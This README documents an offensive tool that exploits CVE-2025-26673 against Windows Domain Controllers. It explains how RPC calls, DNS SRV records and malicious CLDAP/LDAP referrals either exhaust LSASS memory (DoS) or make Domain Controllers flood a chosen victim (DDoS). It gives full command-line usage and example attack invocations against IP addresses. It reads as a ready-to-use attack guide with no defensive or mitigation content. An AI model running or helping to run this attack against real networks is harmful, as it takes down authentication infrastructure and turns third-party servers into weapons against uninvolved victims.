# Win-DoS & Win-DDoS LDAP Attacks
This folder contains the tool that exploits CVE-2025-26673 for either DoS or DDoS.
The tool sends the DsrGetDcNameEx2 RPC call to the specified Domain Controller/s in order to turn them into LDAP clients of the LDAP server implemented in the tool. Once the tool becomes the LDAP server of the chosen Domain Controller/s, then the tool uses LDAP Referrals to create either one of the two scenarios:

* To create DDoS leveraging the chosen Domain Controllers, the tool answers to the chosen Domain Controllers with LDAP Referral URLs that refer the Domain Controllers to flood any specific IP and port.

* To create DoS in a chosen Domain Controller, the tools answers to the chosen Domain Controller with a huge list of LDAP Referral URLs that do not lead anywhere but consume a lot of memory inside the LSASS process. In this scenario the tool performs the whole process starting from the RPC call many times in order to fill the remote LSASS process as much as possible.

## How it works
1. **RPC Call**:
   The tool calls the DsrGetDcNameEx2 RPC call (with the domain specified in the arguments) on the chosen Domain Controller/s in order to trigger them to connect to the tool's CLDAP server.

2. **DNS SRV Resolution**:
   The Domain Controller/s need to resolve the domain provided in the RPC call. They query 2 DNS SRV records of the provided domain in the following format:
   
   * _ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.PROVIDED_DOMAIN
   * _ldap._tcp.dc._msdcs.PROVIDED_DOMAIN

   Both records need to resolve to the tool's domain/hostname and port. This is the domain/hostname and port where the tool set up both a CLDAP server and an LDAP server (same port). If you use the DoS mode of the tool, the provided domain will be prefixed with a UUID string.

3. **CLDAP Interaction**:
   * The Domain Controller/s send a CLDAP query (LDAP over UDP) to the tool's CLDAP server
   * The tool's CLDAP server returns an LDAP Referral to the tool's LDAP server

4. **LDAP Interaction**:
   * The Domain Controller/s send an LDAP query to the tool's LDAP server
   * The tool's LDAP server returns either an extremely huge list of referral to create DoS on the Domain Controller, or alternatively, to create DDoS using the Domain Controllers, returns a list of referrals all points to a speicific IP and port (the DDoS victim)

## Setup

**Install Dependencies**:
```bash
pip install -r requirements.txt
```

**DNS Records**:
set

## Usage
**The first argument for the tool is the mode**. It must be either `ddos` or `dos`. Each mode has different parameters:

### DDoS
```bash
usage: main.py ddos [-h] --dos-soldiers DOS_SOLDIERS [DOS_SOLDIERS ...] [--total-soldiers-timeout TOTAL_SOLDIERS_TIMEOUT] --dos-victim-url DOS_VICTIM_URL [--listen-port LISTEN_PORT] [--req-count REQ_COUNT] --domain-name DOMAIN_NAME --tcp-ldap-url TCP_LDAP_URL

options:
  -h, --help            show this help message and exit
  --dos-soldiers DOS_SOLDIERS [DOS_SOLDIERS ...]
                        List of IPs of the DoS soldier machines
  --total-soldiers-timeout, -t TOTAL_SOLDIERS_TIMEOUT
                        Total time to wait for all soldiers to finish (default: 60 seconds)
  --dos-victim-url DOS_VICTIM_URL
                        URL of the victim server for DDoS
  --listen-port, -l LISTEN_PORT
                        UDP & TCP port for servers to listen on (default: 389)
  --req-count, -c REQ_COUNT
                        Number of requests to send
  --domain-name, -d DOMAIN_NAME
                        This is the domain name for which the Domain Controller sends SRV records for. This domain name should have SRV records for the subdomain "_ldap._tcp.dc._msdcs." and "_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs." (or just one a wildcard SRV record) that lead to the tool's domain/hostname and port. If the mode is 'dos' then this domain name will be prefixed with a UUID subdomain. In this case, that means that the SRV record for this domain name must be a wildcard SRV record.
  --tcp-ldap-url TCP_LDAP_URL
                        TCP LDAP URL for malicious referral
```

#### Example Usage
```bash
python .\main.py ddos -h --dos-soldiers 172.27.95.196 --req-count 1000 --domain-name your-domain.com --tcp-ldap-url tcp-ldap.your-domain.com --dos-victim-url ddos-victim.your-domain.com:12345
```

### DoS
```bash
usage: main.py dos [-h] --target TARGET [--listen-port LISTEN_PORT] [--req-count REQ_COUNT] --domain-name DOMAIN_NAME --tcp-ldap-url TCP_LDAP_URL

options:
  -h, --help            show this help message and exit
  --target TARGET       Target IP for the DoS attack
  --listen-port, -l LISTEN_PORT
                        UDP & TCP port for servers to listen on (default: 389)
  --req-count, -c REQ_COUNT
                        Number of requests to send
  --domain-name, -d DOMAIN_NAME
                        DomainName parameter used in LDAP. If the mode is 'dos' then this domain name will be prefixed with a UUID subdomain. This means that the SRV record for this domain name should be a wildcard SRV record.
  --tcp-ldap-url TCP_LDAP_URL
                        TCP LDAP URL for malicious referral
```

#### Example Usage
```bash
python .\main.py dos --target 172.27.95.196 --req-count 200000 --domain-name dos.your-domain.com --tcp-ldap-url tcp-ldap.your-domain.com
```

